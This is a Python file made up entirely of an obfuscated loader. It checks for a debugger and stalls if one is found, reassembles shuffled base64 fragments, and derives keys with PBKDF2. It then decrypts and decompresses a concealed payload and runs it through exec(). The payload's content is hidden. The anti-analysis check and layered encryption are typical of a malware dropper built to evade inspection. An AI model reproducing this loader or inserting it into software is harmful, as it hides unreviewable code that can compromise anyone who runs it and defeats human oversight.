import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_8d4567_0 = 'YvqoRvK/ZqRuNDn5Oue1hbl'
_8d4567_1 = '1qbh9hshjlmlb638YyDysS1C3RRHoJ34zqesbKFpwYcldqTVmNV/XTZ'
_8d4567_2 = 'jxB/qWVj44VisMzfwr3TlhFf/k5IEZKG3t5962j'
_8d4567_3 = 'bt9fLt7uaOuES6N2kmuBt34WEstJJ7umuq8iR'
_8d4567_4 = 'zHv39oxYxB5PvHxzB1nUaqCe75EApe7xTQNKZ/pPy5xEntftKHt/eUU3qc5V+'
_8d4567_5 = 'YeifGIG3Zu1c9bHRLhVUmTZm3rA81AkKCnW'
_8d4567_6 = '3FZS7q5cX'
_8d4567_7 = 'TAkvCjD4nf0Fk3yM7VkXFI0/1Mzz4pnkW2bivT'
_8d4567_8 = 'BBskJdzxvZzAT/Xe//v0M7gNuxT1gbbxgomKgDWagPhAe3LoRtkwUlJCsTof'
_8d4567_9 = 'iyG+sL2wsMsaHgGjJK4YKcOFb/0b'
_8d4567_10 = '4352CcckO+12cYmA2RkT+nOJM6GS6AV+l9CrLoGbAN0no'
_8d4567_11 = 'Yfyy+zeYf+ITWu2dQ9r02Bv6YbzrlTVv1EQG8uN1ywtf/rfpLUHve9'
_8d4567_12 = '6YwqN4QeZXBiLOKhpNLBk'
_8d4567_13 = 'w532M3R8+EXq3hhpjTh4Uox0bMm+65zIzPY0CYEDxP9DsZyBSOfLG'
_8d4567_14 = 'sAAkpPXDeIPOAJfHCBuWpAz+chHw3cbtZ12ECPqtUrkeFA'
_8d4567_15 = 'tkR4S3LXXmjpQ+YCIB7PAbaNbP'
_8d4567_16 = 'jx/pE78ysV+oKaMJLk+D6yDFFpxEz4PJQRq6N/RTJgdx'
_8d4567_17 = '6ryItMkkWUWebNnCoFMnXcCzabcSuFDdXJIEirlG2O'
_8d4567_18 = 'cmuS4ibnuflOVIZsYGjT9oiZxU4KOihtM'
_8d4567_19 = 'G7a4mUEaVpBnbyUs3Q12nsr5pI5CoIj7v+XHQzodHBZDOifk'
_8d4567_20 = 'F3p3IBZI9OCdon5jxi7IXPXIuia1THLh7'
_8d4567_21 = 'EYlWRWGxc9qHW1bFGoL76DvPSIRqAtjDMYKFn'
_8d4567_22 = 'gfZaB5hlEv0LOV5iAHqqf9hjJEHYsts8'
_8d4567_23 = 'VM3ZK4dd1YqYlolRpQZcc3ZVhl7B7'
_8d4567_24 = 'Rjns+xeguCoY5RQ16JGLI4js+i/rN/8aNxhzVlvmyBnYH1'
_8d4567_25 = 'GD5vUS9lQ1bXOLng6w8ex6'
_8d4567_26 = 'BOIHVCJyCjmgTjgDNwVuzm4jVz0ndG1bW5k7+9cq'
_8d4567_27 = '3fY6QMpWpgedOXs1ZSMso4NJqNdZGEBL0aa3KxPQulf'
_8d4567_28 = 'EeMW/tc/ngwCla1LtUWnNZps96CiSKm/8+6mT4WHyE2fy7hai057sN7'
_8d4567_29 = '6MFtj8kdCu6O2v7plkv0IWhosw12Xj2XiKDcf6'
_8d4567_30 = 'Hbjkp5AaJYYBRJrhwdi5At+4HH/rlsyxN1rZ3+7ZTuUHq2jjRKj4swJibL'
_8d4567_31 = 'jBt2owJacHNbKRthA+dXI46iH2wpR2'
_pls = [_8d4567_0, _8d4567_1, _8d4567_2, _8d4567_3, _8d4567_4, _8d4567_5, _8d4567_6, _8d4567_7, _8d4567_8, _8d4567_9, _8d4567_10, _8d4567_11, _8d4567_12, _8d4567_13, _8d4567_14, _8d4567_15, _8d4567_16, _8d4567_17, _8d4567_18, _8d4567_19, _8d4567_20, _8d4567_21, _8d4567_22, _8d4567_23, _8d4567_24, _8d4567_25, _8d4567_26, _8d4567_27, _8d4567_28, _8d4567_29, _8d4567_30, _8d4567_31]
_af38a9 = [(11157,48447,2),(36425,6322,2),(11515,10579,2),(64515,21718,2),(47207,64554,2),(38929,25293,2),(49070,5154,2),(57324,6418,2),(47624,58171,2),(42125,39504,2),(32015,13689,2),(21976,37124,2),(47809,60780,2),(57333,28281,2),(13730,205,2),(26600,41176,2),(0,0,0),(0,0,0)]
_c6e323 = 'lqqW+w=='
_29a1fb = 'RDHXyfPlVSiPbSMw'
_0212ef = 'zxwAKxDJaBI='
_357e90 = [8, 14, 21, 10, 4, 27, 31, 1, 2, 28, 0, 6, 24, 15, 5, 29, 16, 12, 25, 9, 22, 26, 23, 19, 30, 17, 20, 18, 3, 11, 7, 13]
_salt = base64.b64decode(_0212ef)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _357e90
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_ad8096 = base64.b64decode(_assembled)
_d07451 = 32
_f14c41 = _ad8096[:-_d07451]
_d07451 = _ad8096[-_d07451:]
_6cc6ae = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_af38a9)
_hdr = base64.b64decode(_c6e323)
_nonce = base64.b64decode(_29a1fb)
_km_seed = hashlib.sha256(_6cc6ae + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _f14c41, hashlib.sha256).digest()
if _calc_tag != _d07451:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_f14c41)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_f14c41, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_6ab8f9'] = mmap
globals()['_24a522'] = lambda i: globals()['_6ab8f9'][str(i)]
_x = globals()['_24a522']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
